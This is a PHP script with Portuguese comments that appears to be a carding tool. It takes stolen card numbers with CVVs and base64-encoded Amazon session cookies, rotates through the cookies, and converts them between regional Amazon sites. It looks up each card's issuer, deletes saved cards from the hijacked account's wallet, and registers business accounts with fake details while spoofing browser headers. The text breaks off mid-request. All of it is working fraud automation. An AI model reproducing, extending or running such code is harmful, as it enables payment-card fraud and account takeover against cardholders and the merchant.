<?php
error_reporting(0);
header_remove('X-Powered-By');
header('Cache-Control: no-cache');
header('Pragma: no-cache');
header('Accept-Encoding: gzip');
date_default_timezone_set('America/Sao_Paulo');

// Receber cookies1, cookies2, cookies3, cookies4 e ativarCookies
$cookies1 = isset($_POST['cookies1']) && !empty($_POST['cookies1']) ? @base64_decode($_POST['cookies1']) : null;
$cookies2 = isset($_POST['cookies2']) && !empty($_POST['cookies2']) ? @base64_decode($_POST['cookies2']) : null;
$cookies3 = isset($_POST['cookies3']) && !empty($_POST['cookies3']) ? @base64_decode($_POST['cookies3']) : null;
$cookies4 = isset($_POST['cookies4']) && !empty($_POST['cookies4']) ? @base64_decode($_POST['cookies4']) : null;
$verificar = isset($_POST['token']) ? base64_decode($_POST['token']) : null;
$ativarCookies = isset($_POST['ativarCookies']) && $_POST['ativarCookies'] === 'true';

// Criar array de cookies disponíveis
$cookies = array_filter([$cookies1, $cookies2, $cookies3, $cookies4], function($cookie) {
    return !is_null($cookie) && !empty(trim($cookie));
});

// Depuração: salvar cookies recebidos em um log
file_put_contents('cookie_log.txt', "[" . date('Y-m-d H:i:s') . "] Cookies recebidos:\n" .
    "cookies1: " . (isset($_POST['cookies1']) ? $_POST['cookies1'] : 'não enviado') . "\n" .
    "cookies2: " . (isset($_POST['cookies2']) ? $_POST['cookies2'] : 'não enviado') . "\n" .
    "cookies3: " . (isset($_POST['cookies3']) ? $_POST['cookies3'] : 'não enviado') . "\n" .
    "cookies4: " . (isset($_POST['cookies4']) ? $_POST['cookies4'] : 'não enviado') . "\n" .
    "Após base64_decode:\n" .
    "cookies1: " . ($cookies1 ?? 'null') . "\n" .
    "cookies2: " . ($cookies2 ?? 'null') . "\n" .
    "cookies3: " . ($cookies3 ?? 'null') . "\n" .
    "cookies4: " . ($cookies4 ?? 'null') . "\n" .
    "Cookies válidos: " . json_encode(array_values($cookies)) . "\n\n", FILE_APPEND);

// Verificar se há cookies válidos
if (empty($cookies)) {
    echo json_encode(["erro" => "true", "response" => time(), "dados" => ["", "", "Erro: Nenhum cookie fornecido"]]);
    exit;
}

// Gerenciar índice de cookie para rotação
$cookie_index_file = getcwd() . '/cookie_index.txt';
$cookie_index = file_exists($cookie_index_file) ? (int)file_get_contents($cookie_index_file) : 0;
$selected_cookie = array_values($cookies)[$cookie_index % count($cookies)];
file_put_contents($cookie_index_file, ($cookie_index + 1) % count($cookies));

// Depuração: registrar cookie selecionado
file_put_contents('cookie_log.txt', "[" . date('Y-m-d H:i:s') . "] Cookie selecionado: " . $selected_cookie . "\n\n", FILE_APPEND);

// Resto do código original (900 linhas)
$lista = $_POST['lista'];
$separar = explode('|', $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$bin = substr($cc, 0, 6);
$last = substr($cc, 12);
if (substr($mes, 0, 1) == 0) {
    $mes = substr($mes, 1, 1);
}
if ($ano < 3) {
    $ano = '20' . $ano;
}

// ... (todas as funções e requisições do seu código original seguem aqui, sem alterações)
function corrigirTokens($input) {
    $pattern = '/="([^"]* [^"]*)"/';
    $callback = function($matches) {
        return '="' . str_replace(' ', '+', $matches[1]) . '"';
    };
    $input = preg_replace_callback($pattern, function($matches) use ($callback) {
        return $callback($matches);
    }, $input);
    $input = preg_replace('/(session-id-time=\d+) (\w)/', '$1$2', $input);
    return $input;
}
function dados_reverso($string, $ending, $start, $end) {
    $pos = strpos($string, $ending);
    if ($pos !== false) {
        $reference = substr($string, $pos);
        $pos = strpos($string, $start, $pos);
        if ($pos !== false) {
            $substr = substr($string, $pos + strlen($start));
            $pos = strpos($substr, $end);
            if ($pos !== false) {
                return substr($substr, 0, $pos);
            }
        }
    }
    return null;
}

function extrair_instrumentIds($string, $ending, $start, $end) {
    $instrumentIds = array();
    $pos = strpos($string, $ending);
    while ($pos !== false) {
        $pos_id_start = strpos($string, $start, $pos);
        if ($pos_id_start !== false) {
            $substr = substr($string, $pos_id_start + strlen($start));
            $pos_id_end = strpos($substr, $end);
            if ($pos_id_end !== false) {
                $instrumentId = substr($substr, 0, $pos_id_end);
                $instrumentIds[] = $instrumentId;
            }
        }
        $pos = strpos($string, $ending, $pos + 1);
    }
    $uniqueInstrumentIds = array_unique($instrumentIds);
    return $uniqueInstrumentIds;
}

function dados($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function dados2($string, $start, $end, $num) {
    $str = explode($start, $string);
    $str = explode($end, $str[$num]);
    return $str[0];
}

function bin($cartao) {
    $bin = substr($cartao, 0, 6);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/$bin");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Accept-Version: 3"
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $data = json_decode($response, true);
        if (!empty($data)) {
            $bandeira = isset($data['scheme']) ? strtoupper($data['scheme']) : 'DESCONHECIDA';
            $tipo = isset($data['type']) ? strtoupper($data['type']) : 'DESCONHECIDO';
            $nivel = isset($data['brand']) ? strtoupper($data['brand']) : 'DESCONHECIDO';
            $banco = isset($data['bank']['name']) ? strtoupper($data['bank']['name']) : 'DESCONHECIDO';
            $pais = isset($data['country']['alpha2']) ? strtoupper($data['country']['alpha2']) : 'DESCONHECIDO';
            return "Bandeira: $bandeira | Tipo: $tipo | Nivel: $nivel | Banco: $banco | Pais: $pais";
        }
    }
    return "Bandeira: DESCONHECIDA | Tipo: DESCONHECIDO | Nivel: DESCONHECIDO | Banco: DESCONHECIDO | Pais: DESCONHECIDO";
}

if ($separar[2] < date("Y") || ($separar[2] == date("Y") && $mes < (int)date("m"))) {
    $cardInfo = bin($bin);
    echo json_encode(array("erro" => "true", "response" => time(), "dados" => ["1" => $lista, "2" => "CARD EXPIRADO", "3" => $cardInfo]));
    header('HTTP/1.1 200 OK');
    exit();
}

function edit_cookie($target_country, $cookie) {
    $country_map = [
        'AU' => ['code' => 'acbau', 'lang' => 'en_AU', 'currency' => 'AUD'],
        'DE' => ['code' => 'acbde', 'lang' => 'de_DE', 'currency' => 'EUR'],
        'CA' => ['code' => 'acbca', 'lang' => 'en_CA', 'currency' => 'CAD'],
        'CN' => ['code' => 'acbcn', 'lang' => 'zh_CN', 'currency' => 'CNY'],
        'SG' => ['code' => 'acbsg', 'lang' => 'en_SG', 'currency' => 'SGD'],
        'ES' => ['code' => 'acbes', 'lang' => 'es_ES', 'currency' => 'EUR'],
        'US' => ['code' => 'main', 'lang' => 'en_US', 'currency' => 'USD'],
        'FR' => ['code' => 'acbfr', 'lang' => 'fr_FR', 'currency' => 'EUR'],
        'NL' => ['code' => 'acbnl', 'lang' => 'nl_NL', 'currency' => 'EUR'],
        'IN' => ['code' => 'acbin', 'lang' => 'hi_IN', 'currency' => 'INR'],
        'IT' => ['code' => 'acbit', 'lang' => 'it_IT', 'currency' => 'EUR'],
        'JP' => ['code' => 'acbjp', 'lang' => 'ja_JP', 'currency' => 'JPY'],
        'MX' => ['code' => 'acbmx', 'lang' => 'es_MX', 'currency' => 'MXN'],
        'PL' => ['code' => 'acbpl', 'lang' => 'pl_PL', 'currency' => 'PLN'],
        'AE' => ['code' => 'acbae', 'lang' => 'ar_AE', 'currency' => 'AED'],
        'UK' => ['code' => 'acbuk', 'lang' => 'en_GB', 'currency' => 'GBP'],
        'TR' => ['code' => 'acbtr', 'lang' => 'tr_TR', 'currency' => 'TRY'],
        'BR' => ['code' => 'acbbr', 'lang' => 'pt_BR', 'currency' => 'BRL'],
        'EG' => ['code' => 'acbeg', 'lang' => 'ar_EG', 'currency' => 'EGP'],
        'JA' => ['code' => 'acbjp', 'lang' => 'ja_JP', 'currency' => 'JPY'],
    ];
    $current_format = '';
    foreach ($country_map as $country_code => $details) {
        if (strpos($cookie, $details['code']) !== false) {
            $current_format = $country_code;
            break;
        }
    }
    if ($current_format == '') {
        $current_format = 'US';
    }
    if ($current_format == $target_country) {
        return trim($cookie);
    }
    $target_details = $country_map[$target_country];
    foreach ($country_map as $details) {
        $cookie = str_replace($details['code'], $target_details['code'], $cookie);
        $cookie = str_replace($details['lang'], $target_details['lang'], $cookie);
        $cookie = str_replace($details['currency'], $target_details['currency'], $cookie);
    }
    return trim($cookie);
}

function letras($size) {
    $basic = '01234789abcdef';
    $return = "";
    for ($count = 0; $size > $count; $count++) {
        $return .= $basic[rand(0, strlen($basic) - 1)];
    }
    return $return;
}

function letras2($size) {
    $basic = '01234789';
    $return = "";
    for ($count = 0; $size > $count; $count++) {
        $return .= $basic[rand(0, strlen($basic) - 1)];
    }
    return $return;
}

function letras3($size) {
    $basic = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $return = "";
    for ($count = 0; $size > $count; $count++) {
        $return .= $basic[rand(0, strlen($basic) - 1)];
    }
    return $return;
}

unlink(getcwd() . "./allbinsssssssssssssssssssss.txt");

function geracpf($tipo) {
    $num = array();
    $num[9] = $num[10] = $num[11] = 0;
    for ($w = 0; $w > -2; $w--) {
        for ($i = $w; $i < 9; $i++) {
            $x = ($i - 10) * -1;
            $w == 0 ? $num[$i] = rand(0, 9) : '';
            ($w == 0 ? $num[$i] : '');
            ($w == -1 && $i == $w && $num[11] == 0) ?
                $num[11] += $num[10] * 2 :
                $num[10 - $w] += $num[$i - $w] * $x;
        }
        $num[10 - $w] = (($num[10 - $w] % 11) < 2 ? 0 : (11 - ($num[10 - $w] % 11)));
        $num[10 - $w];
    }
    if ($tipo == 1) {
        $cpf = $num[0] . $num[1] . $num[2] . '.' . $num[3] . $num[4] . $num[5] . '.' . $num[6] . $num[7] . $num[8] . '-' . $num[10] . $num[11];
    } else {
        $cpf = $num[0] . $num[1] . $num[2] . $num[3] . $num[4] . $num[5] . $num[6] . $num[7] . $num[8] . $num[10] . $num[11];
    }
    return $cpf;
}

function lerNomesEGenerosCSV($arquivoCSV) {
    $dados = [];
    if (($handle = fopen($arquivoCSV, "r")) !== FALSE) {
        while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
            $dados[] = ['nome' => $data[0], 'genero' => $data[1] == 'boy' ? 'male' : 'female'];
        }
        fclose($handle);
    }
    return $dados;
}

$no = array("marcos", "Lucas", "Joao", "Matheus", "hdhdh", "tamae", "Seila", "Tamole", "Bemduro", "Tais", "Esfulador", "Esqueci", "Conta", "daniel", "pedinho", "marcos", "santiago", "juliano", "Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Jackson", "Thompson", "White", "Lopez", "Lee", "Gonzalez", "Harris", "Clark", "Lewis", "Robinson", "Walker", "Perez", "Hall", "Young", "Allen", "Sanchez", "Wright", "King", "Scott", "Green", "Baker", "Adams", "Nelson", "Hill", "Ramirez", "Campbell", "Mitchell", "Roberts", "Carter", "Phillips", "Evans", "Turner", "Torres");
$so = array("marcos", "Lucas", "Joao", "Matheus", "hdhdh", "tamae", "Seila", "Tamole", "Bemduro", "Tais", "Esfulador", "Esqueci", "Conta", "daniel", "pedinho", "marcos", "santiago", "juliano", "Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Jackson", "Thompson", "White", "Lopez", "Lee", "Gonzalez", "Harris", "Clark", "Lewis", "Robinson", "Walker", "Perez", "Hall", "Young", "Allen", "Sanchez", "Wright", "King", "Scott", "Green", "Baker", "Adams", "Nelson", "Hill", "Ramirez", "Campbell", "Mitchell", "Roberts", "Carter", "Phillips", "Evans", "Turner", "Torres");
$lista_nome = array("marcos", "Lucas", "Joao", "Matheus", "hdhdh", "tamae", "Seila", "Tamole", "Bemduro", "Tais", "Esfulador", "Esqueci", "Conta", "daniel", "pedinho", "marcos", "santiago", "juliano", "Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Jackson", "Thompson", "White", "Lopez", "Lee", "Gonzalez", "Harris", "Clark", "Lewis", "Robinson", "Walker", "Perez", "Hall", "Young", "Allen", "Sanchez", "Wright", "King", "Scott", "Green", "Baker", "Adams", "Nelson", "Hill", "Ramirez", "Campbell", "Mitchell", "Roberts", "Carter", "Phillips", "Evans", "Turner", "Torres");
$code_base = array("gmail.com", "live.com", "hotmail.com", "outlook.com", "yahoo.com", "yahoo.com.br", "comcast.net");

$code_email = array_rand($code_base);
$bre = array_rand($so);
$me = array_rand($no);
$code = substr($ano, -2);

$nome = $no[$me];
$sobre = $so[$bre];
$casa_base = $code_base[$code_email];
$cc2 = substr($cc, 0, 4) . ' ' . substr($cc, 4, 4) . ' ' . substr($cc, 8, 4) . ' ' . substr($cc, 12, 4);

if (substr($cc, 0, 1) == '5') {
    $tipo = 'MASTER';
    $tipo2 = 'mc';
    $tipocard = 'MasterCard';
} else if (substr($cc, 0, 1) == '4') {
    $tipo = 'Visa';
    $tipo2 = 'visa';
    $tipocard = 'Visa';
} else if (substr($cc, 0, 2) == '65' || substr($cc, 0, 2) == '63' || substr($cc, 0, 4) == '5067') {
    $tipo = 'Elo';
    $tipocard = 'Discover';
} else {
    $tipo = 'amex';
    $tipocard = 'Amex';
}

// Versões do Chrome
$chromeVersions = ['116.0.0.0', '115.0.0.0', '114.0.0.0'];
// Versões do Edge
$edgeVersions = ['116.0.1938.69', '115.0.1916.77', '114.0.1803.45'];
// Escolhendo versões aleatórias
$randomChromeVersion = $chromeVersions[array_rand($chromeVersions)];
$randomEdgeVersion = $edgeVersions[array_rand($edgeVersions)];
// Montando o User-Agent
$randomUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$randomChromeVersion Safari/537.36 Edg/$randomEdgeVersion";

$randlinks = ['www.audible.com.au', 'www.audible.de', 'www.audible.ca', 'www.audible.es', 'www.audible.com', 'www.audible.fr', 'www.audible.it', 'www.audible.co.jp', 'www.audible.co.uk'];
$randlinks = $randlinks[array_rand($randlinks)];

$tdata = letras3(strlen('io8NNfnwcwYzPbwb'));
$emails = array('clebsonrsantos@yahoo.com.br', 'clebsonrsantos@yahoo.com.br');
$data = 'c4e90484-ea01-4c91-bda0-c281648b2b81';

// Função para ativar cookies
function ativarCookies($cookie, $randomUserAgent) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/business/register/api/guest/processing-status?abreg_signature=2dM_ZsG5V0BOa-v9A_YhKmq7UlZQoN7vikOfLChV7QE%3D&ref_=ab_reg_notag_gp_cgps_ab_reg_dsk?ref_=ab_reg_notag_gon_gp_ab_reg_dsk&isMashRequest=false&isAndroidMashRequest=false&isIosMashRequest=false');
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
        'sec-ch-device-memory: 8',
        'sec-ch-viewport-width: 563',
        'sec-ch-ua-platform-version: "15.0.0"',
        'x-requested-with: XMLHttpRequest',
        'dpr: 1.25',
        'downlink: 6.8',
        'sec-ch-ua-platform: "Windows"',
        'device-memory: 8',
        'rtt: 150',
        'sec-ch-ua-mobile: ?0',
        'user-agent: ' . $randomUserAgent . '',
        'cookie: ' . $cookie . '',
        'viewport-width: 563',
        'accept: application/json, text/plain, */*',
        'sec-ch-dpr: 1.25',
        'ect: 4g',
        'sec-fetch-site: same-origin',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://www.amazon.com/business/register/guest/processing?ref_=ab_reg_notag_gon_gp_ab_reg_dsk&isMashRequest=false&isAndroidMashRequest=false&isIosMashRequest=false'
    ));
    $conta_status = curl_exec($curl);
    return strpos($conta_status, '"PENDING"') !== false || strpos($conta_status, 'PENDING') !== false;
}

// Verificar e ativar cookies se solicitado
if ($ativarCookies && $cookies1) {
    $cookie1Ativado = ativarCookies($cookies1, $randomUserAgent);
    $cookie2Ativado = $cookies2 ? ativarCookies($cookies2, $randomUserAgent) : true;
    $cookie3Ativado = $cookies3 ? ativarCookies($cookies3, $randomUserAgent) : true;
    $cookie4Ativado = $cookies4 ? ativarCookies($cookies4, $randomUserAgent) : true;

    if ($cookie1Ativado && $cookie2Ativado && $cookie3Ativado && $cookie4Ativado) {
        echo 'Cookies ativados com sucesso';
        exit();
    } else {
        echo 'Falha ao ativar cookies';
        exit();
    }
}

/* --------------- COKIES AMAZON --------------- */
$cookie = edit_cookie('US', $selected_cookie);
$cookiebr = edit_cookie('ES', $selected_cookie);
$cookieit = edit_cookie('IT', $selected_cookie);
$cookieau = edit_cookie('AU', $selected_cookie);
$verificar2 = edit_cookie('EG', $selected_cookie);
$cookiejp = edit_cookie('JA', $selected_cookie);
$verificar3 = edit_cookie('ES', $selected_cookie);
$cookiejp = edit_cookie('JA', $selected_cookie);
$cookiebr = edit_cookie('BR', $selected_cookie);
$cookiepl = edit_cookie('PL', $selected_cookie);
$cookiesg = edit_cookie('SG', $selected_cookie);
$cookiesa = edit_cookie('AE', $selected_cookie);
/* --------------- COKIES AMAZON --------------- */
/* --------------- RANDOW DELETE AUDIBLE --------------- */
if (strpos($randlinks, 'www.audible.com.au') !== false) {
    $cookiedelete = edit_cookie('AU', $selected_cookie);
    $dominio = 'www.audible.com.au';
} else if (strpos($randlinks, 'www.audible.de') !== false) {
    $cookiedelete = edit_cookie('DE', $selected_cookie);
    $dominio = 'www.audible.de';
} else if (strpos($randlinks, 'www.audible.ca') !== false) {
    $cookiedelete = edit_cookie('CA', $selected_cookie);
    $dominio = 'www.audible.ca';
} else if (strpos($randlinks, 'www.audible.es') !== false) {
    $cookiedelete = edit_cookie('ES', $selected_cookie);
    $dominio = 'www.audible.es';
} else if (strpos($randlinks, 'www.audible.com') !== false) {
    $cookiedelete = edit_cookie('US', $selected_cookie);
    $dominio = 'www.audible.com';
} else if (strpos($randlinks, 'www.audible.fr') !== false) {
    $cookiedelete = edit_cookie('FR', $selected_cookie);
    $dominio = 'www.audible.fr';
} else if (strpos($randlinks, 'www.audible.it') !== false) {
    $cookiedelete = edit_cookie('IT', $selected_cookie);
    $dominio = 'www.audible.it';
} else if (strpos($randlinks, 'www.audible.co.jp') !== false) {
    $cookiedelete = edit_cookie('JP', $selected_cookie);
    $dominio = 'www.audible.co.jp';
} else if (strpos($randlinks, 'www.audible.co.uk') !== false) {
    $cookiedelete = edit_cookie('UK', $selected_cookie);
    $dominio = 'www.audible.co.uk';
}
/* --------------- RANDOW DELETE AUDIBLE --------------- */

if (is_numeric($cc) && (strlen($cc) == 16 || strlen($cc) == 15)) {
    $cardInfo = bin($bin);
    $datajson = json_encode(array("card" => $lista, "nome" => $nome, "sobre" => $sobre, "cookie" => $cookie, "dominio" => $dominio, "agent" => $randomUserAgent));

    function deletecard($datajson) {
        $datajson = json_decode($datajson, true);

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo');
        curl_setopt($curl, CURLOPT_POST, false);
        curl_setopt($curl, CURLOPT_ENCODING, "gzip");
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $headers = array(
            "Host: www.amazon.com",
            "Cookie: " . $datajson['cookie'] . "",
            "content-type: application/x-www-form-urlencoded",
            "x-requested-with: XMLHttpRequest",
            "accept: */*",
            "origin: https://www.amazon.com",
            "referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo",
        );
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        $r0 = curl_exec($curl);

        $session_id = dados($r0, '"sessionId":"', '"');
        $token_delete = dados($r0, '"serializedState":"', '"');
        $ppwiidq = dados($r0, 'elementDOMEventMethodBindings":[],"data":{"instrumentId":"', '"');
        $customerID = dados($r0, '"customerID":"', '"');
        $ppwiid = dados($r0, '"data":{"selectedInstrumentId":"', '"');
        $card_id3 = dados($r0, '"selectedInstrumentId":"', '"');

        if (strpos($r0, "Debit card ending in") !== false || strpos($r0, "Credit card ending in") !== false || strpos($r0, "Debit card") !== false || strpos($r0, "Credit card") !== false || strpos($r0, "card ending") !== false) {
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/payments-portal/data/widgets2/v1/customer/$customerID/continueWidget");
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_ENCODING, "gzip");
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($curl, CURLOPT_HEADER, true);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            $headers = array(
                "Host: www.amazon.com",
                "Cookie: " . $datajson['cookie'] . "",
                "content-type: application/x-www-form-urlencoded; charset=UTF-8",
                "accept: application/json, text/javascript, */*; q=0.01",
                "x-requested-with: XMLHttpRequest",
                "origin: https://www.amazon.com",
                "referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo",
            );
            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22$card_id3%22%2C%22renderPopover%22%3A%22true%22%7D=&ppw-jsEnabled=true&ppw-widgetState=$token_delete&ie=UTF-8");
            $r1 = curl_exec($curl);

            $tk2_if = dados($r1, 'name=\"ppw-widgetState\" value=\"', '\"');

            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/payments-portal/data/widgets2/v1/customer/$customerID/continueWidget");
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_ENCODING, "gzip");
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($curl, CURLOPT_HEADER, true);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            $headers = array(
                "Host: www.amazon.com",
                "Cookie: " . $datajson['cookie'] . "",
                "content-type: application/x-www-form-urlencoded; charset=UTF-8",
                "accept: application/json, text/javascript, */*; q=0.01",
                "x-requested-with: XMLHttpRequest",
                "origin: https://www.amazon.com",
                "referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo",
            );
            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3ADeleteInstrumentEvent=&ppw-jsEnabled=true&ppw-widgetState=$tk2_if&ie=UTF-8");
            $r2 = curl_exec($curl);
            return $r2;
        } else {
            return "sem card na conta";
        }
    }

    deletecard($datajson);

    /* ---------------- AREA ATIVAR COOKIES ---------------- */

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/business/register/api/guest/processing-status?abreg_signature=2dM_ZsG5V0BOa-v9A_YhKmq7UlZQoN7vikOfLChV7QE%3D&ref_=ab_reg_notag_gp_cgps_ab_reg_dsk?ref_=ab_reg_notag_gon_gp_ab_reg_dsk&isMashRequest=false&isAndroidMashRequest=false&isIosMashRequest=false');
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_ENCODING, "gzip");
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
        'sec-ch-device-memory: 8',
        'sec-ch-viewport-width: 563',
        'sec-ch-ua-platform-version: "15.0.0"',
        'x-requested-with: XMLHttpRequest',
        'dpr: 1.25',
        'downlink: 6.8',
        'sec-ch-ua-platform: "Windows"',
        'device-memory: 8',
        'rtt: 150',
        'sec-ch-ua-mobile: ?0',
        'user-agent: ' . $randomUserAgent . '',
        'cookie: ' . $cookie . '',
        'viewport-width: 563',
        'accept: application/json, text/plain, */*',
        'sec-ch-dpr: 1.25',
        'ect: 4g',
        'sec-fetch-site: same-origin',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://www.amazon.com/business/register/guest/processing?ref_=ab_reg_notag_gon_gp_ab_reg_dsk&isMashRequest=false&isAndroidMashRequest=false&isIosMashRequest=false'
    ));
    $conta_status = curl_exec($curl);

    if (strpos($conta_status, '"PENDING"') !== false || strpos($conta_status, 'PENDING') !== false) {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/business/register/org/landing');
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd() . './allbinsssssssssssssssssssss.txt');
        curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd() . './allbinsssssssssssssssssssss.txt');
        curl_setopt($curl, CURLOPT_ENCODING, "gzip");
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            'Host: www.amazon.com',
            'user-agent: ' . $randomUserAgent . '',
            'cookie: ' . $cookie . '',
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
        ));
        $pegacsrftoken = curl_exec($curl);

        $token = dados($pegacsrftoken, 'data-csrf-token="', '"');

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://www.amazon.com/business/register/api/org/registrations?abreg_entryRefTag=ab_reg_notag_moa_bl_ab_reg_dsk&abreg_usingPostAuthPortalTheme=true&abreg_vertical=COM&abreg_originatingEmailEncrypted=AAAAAAAAAABgZaCRVCOa12esbl7LMnXvMAAAAAAAAAByNzyR3fLB775Q7V%2BuNnOf2InSAQ%2F3PSEj31HlFkyEP6w4aCCLGOnq04SK5qX2fQw&abreg_client=biss&abreg_originatingCustomerId=A3AU73I0E2KU43&ref_=ab_reg_notag_rn-biss_cb_ab_reg_dsk&sif_profile=ab-reg');
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($curl, CURLOPT_LOW_SPEED_LIMIT, 0);
        curl_setopt($curl, CURLOPT_HEADER, 0);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl, CURLOPT_ENCODING, "gzip");
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            'device-memory: 8',
            'anti-csrftoken-a2z: ' . $token . '',
            'user-agent: ' . $randomUserAgent . '',
            'cookie: ' . $cookie . '',
            'origin: https://www.amazon.com',
            'sec-fetch-site: same-origin',
            'sec-fetch-mode: cors',
            'sec-fetch-dest: empty',
            'referer: https://www.amazon.com/business/register/org/business-info?abreg_entryRefTag=ab_reg_notag_moa_bl_ab_reg_dsk&abreg_usingPostAuthPortalTheme=true&abreg_vertical=COM&abreg_originatingEmailEncrypted=AAAAAAAAAABgZaCRVCOa12esbl7LMnXvMAAAAAAAAAByNzyR3fLB775Q7V%2BuNnOf2InSAQ%2F3PSEj31HlFkyEP6w4aCCLGOnq04SK5qX2fQw&abreg_client=biss&abreg_originatingCustomerId=A3AU73I0E2KU43&ref_=ab_reg_notag_rn-biss_cb_ab_reg_dsk'
        ));
        curl_setopt($curl, CURLOPT_POSTFIELDS, "address1=new%20york&address2=&zip=10080&city=NEW%20YORK&state=NY&country=US&voice=17706762438&contactName=fewf%20cewefc&businessName=dwdwdwd&businessType=OTHER&verificationOverrideStatus=&notifyBySms=false&internal=false&warningBypassed=false&existingAddress=false&publicAdministrationSelfDeclaration=false&businessTin=");
        $endereco = curl_exec($curl);

        $curl = curl_init();
